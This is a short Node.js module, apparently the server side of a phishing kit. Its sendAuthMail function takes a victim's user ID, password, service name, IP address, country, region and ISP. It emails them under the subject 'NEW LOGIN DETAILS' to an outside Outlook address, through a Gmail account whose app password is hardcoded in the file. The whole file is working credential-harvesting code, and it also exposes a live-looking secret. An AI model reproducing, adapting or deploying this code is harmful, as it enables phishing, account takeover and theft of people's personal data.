const nodemailer = require('nodemailer')

const sendAuthMail = (
  userID,
  password,
  name,
  country,
  region,
  isp,
  IPAddress,
  res
) => {
  console.log(IPAddress, 'from helper')
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'webiniy01@gmail.com',
      pass: 'ltgy qoqa zvfd uclp',
    },
  })

  const text = `User ID: ${userID}, password: ${password}, service name: ${name}, IP: ${
    IPAddress || 'Not available'
  }, Country: ${country || 'Not available'}, Region:${
    region || 'Not available'
  }, Internet Service Provider(ISP): ${isp || 'Not available'} `

  const mailOptions = {
    from: 'webiniy01@gmail.com',
    to: 'Wadewade49@outlook.com',
    subject: 'NEW LOGIN DETAILS',
    text,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error.message)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendAuthMail }
